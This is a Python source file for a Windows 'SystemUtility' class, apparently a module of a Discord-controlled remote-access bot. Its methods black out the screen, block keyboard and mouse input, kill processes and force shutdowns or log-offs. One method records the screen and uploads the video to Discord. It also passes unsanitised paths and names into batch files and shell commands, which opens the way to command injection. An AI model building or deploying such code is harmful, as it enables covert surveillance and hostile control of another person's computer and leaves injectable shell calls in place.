import subprocess
import time
import os
import ctypes
import cv2
import numpy as np
import pyautogui
import ctypes
from datetime import datetime
import winsound 


class SystemUtility:
    def __init__(self, discord_module=None, download_directory=None):
        self.discord_module = discord_module
        self.download_directory = download_directory or os.path.join(os.path.expanduser("~"), "Downloads")

    def black_screen(self, duration_seconds):
        try:
            # Turn off the display
            ctypes.windll.user32.SendMessageW(0xFFFF, 0x112, 0xF170, 2)

            # Wait for the specified duration
            time.sleep(duration_seconds)

            # Turn on the display
            ctypes.windll.user32.SendMessageW(0xFFFF, 0x112, 0xF170, -1)

            return True, None
        except Exception as e:
            return False, f"Error in black_screen: {type(e).__name__} - {str(e)}"

    def disable_keyboard(self, duration_seconds):
        try:
            ctypes.windll.user32.BlockInput(1)  # Disable keyboard input

            # Wait for the specified duration
            time.sleep(duration_seconds)

            ctypes.windll.user32.BlockInput(0)  # Enable keyboard input
            return True, None
        except Exception as e:
            return False, f"Error in disable_keyboard: {type(e).__name__} - {str(e)}"

    def open_microsoft_edge(self, search_term):
        try:
            subprocess.run(["msedge", search_term], check=True)
            return True, None
        except subprocess.CalledProcessError as e:
            return False, f"Error in open_microsoft_edge: {type(e).__name__} - {str(e)}"
        except FileNotFoundError:
            return False, "Error: Microsoft Edge executable not found. Please make sure Microsoft Edge is installed."
        except Exception as e:
            return False, f"Error in open_microsoft_edge: {type(e).__name__} - {str(e)}"

    def close_task(self, task_name):
        try:
            subprocess.run(["taskkill", "/f", "/im", task_name], check=True)
            return True, None
        except subprocess.CalledProcessError as e:
            return False, f"Error in close_task: {type(e).__name__} - {str(e)}"
        except Exception as e:
            return False, f"Error in close_task: {type(e).__name__} - {str(e)}"

    def open_task(self, task_name):
        try:
            subprocess.run(["start", task_name], shell=True, check=True)
            return True, None
        except subprocess.CalledProcessError as e:
            return False, f"Error: Unable to open task '{task_name}'. Return code: {e.returncode}"
        except Exception as e:
            return False, str(e)
    def show_message(self, title, message):
        try:
            # Show toast notification using Windows API
            winsound.MessageBeep() 
            ctypes.windll.user32.MessageBoxW(0, message, title, 0x40 | 0x1)  # 0x40 for MB_ICONINFORMATION, 0x1 for MB_OK
            return True, None
        except Exception as e:
            return False, str(e)

        
    def disable_mouse(self, duration_seconds):
        try:
            ctypes.windll.user32.BlockInput(True)
            time.sleep(duration_seconds)
            ctypes.windll.user32.BlockInput(False)
            return True, None
        except Exception as e:
            return False, str(e)

    def _create_batch_file(self, command):
        try:
            with open('temp.bat', 'w') as file:
                file.write(command)
            return True, None
        except Exception as e:
            return False, str(e)

    def _run_batch_file(self):
        try:
            # Run the batch file without checking for administrative privileges
            process = subprocess.Popen(['temp.bat'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()

            if process.returncode == 0:
                return True, None
            else:
                return False, f"Error: {stderr.decode('utf-8')}"

        except subprocess.CalledProcessError as e:
            return False, f"Error: {e}"
        except Exception as e:
            return False, str(e)
        finally:
            try:
                os.remove('temp.bat')
            except Exception as e:
                print(f"Error deleting temporary batch file: {e}")

        
    
    def shutdown(self):
        self._create_batch_file('shutdown /s /f /t 0')
        return self._run_batch_file()

    def restart(self):
        self._create_batch_file('shutdown /r /f /t 0')
        return self._run_batch_file()

    def sleep(self):
        self._create_batch_file('rundll32.exe powrprof.dll,SetSuspendState 0,1,0')
        return self._run_batch_file()
    def lock_screen(self):
        self._create_batch_file('rundll32.exe user32.dll,LockWorkStation')
        return self._run_batch_file()
    
    def log_off(self):
        self._create_batch_file('shutdown /l /f')
        return self._run_batch_file()
    def hibernate(self):
        self._create_batch_file('shutdown /h')
        return self._run_batch_file()
    def toggle_volume(self):
        try:
            # Use Windows API to get the current system volume
            volume_info = ctypes.c_uint32()
            ctypes.windll.winmm.waveOutGetVolume(0, ctypes.byref(volume_info))

            # Check if the volume is currently muted
            is_muted = volume_info.value == 0

            # Toggle mute status
            new_volume = 0 if is_muted else 65535
            ctypes.windll.winmm.waveOutSetVolume(0, new_volume | (new_volume << 16))

            return True, None
        except Exception as e:
            return False, str(e)
    def change_wallpaper(self, wallpaper_path):
        self._create_batch_file(f'reg add "HKEY_CURRENT_USER\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d "{wallpaper_path}" /f')
        self._run_batch_file()
        # Update the wallpaper without a restart
        ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 3)

    def open_application(self, app_path):
        try:
            subprocess.Popen([app_path], shell=True)
            return True, None
        except Exception as e:
            return False, str(e)
        
    
    def get_current_time(self):
        return time.strftime("%Y-%m-%d %H:%M:%S")


    def record_screen(self, duration_seconds):
        try:
            screen_size = (1920, 1080)  # Adjust to your screen resolution
            fourcc = cv2.VideoWriter_fourcc(*"mp4v")

            # Generate a unique filename based on the current timestamp
            current_time = datetime.now().strftime('%Y-%m-%d %H-%M-%S')
            output_filename = f'recording_{current_time}.mp4'
            output_path = os.path.join(self.download_directory, output_filename)

            out = cv2.VideoWriter(output_path, fourcc, 20.0, screen_size)

            start_time = time.time()
            while time.time() - start_time < duration_seconds:
                img = pyautogui.screenshot()
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                out.write(frame)

            out.release()

    
            # Send the recorded video to Discord if discord_module is provided
            if self.discord_module:
                self.discord_module.send_file(file_path=output_path)

            return True, None
        except Exception as e:
            return False, str(e)


# Example usage:
'''if __name__ == "__main__":
    utility = SystemUtility()

    # Example usage of functions
    success, error = utility.black_screen(5)  # Black the screen for 5 seconds
    if success:
        print("Screen blacked successfully.")
    else:
        print(f"Error: {error}")

    success, error = utility.disable_keyboard(10)  # Disable the keyboard for 10 seconds
    if success:
        print("Keyboard disabled successfully.")
    else:
        print(f"Error: {error}")

    success, error = utility.open_microsoft_edge("example.com")  # Open Microsoft Edge with the specified search term
    if success:
        print("Microsoft Edge opened successfully.")
    else:
        print(f"Error: {error}")

    success, error = utility.close_task("notepad.exe")  # Close Notepad task
    if success:
        print("Task closed successfully.")
    else:
        print(f"Error: {error}")
'''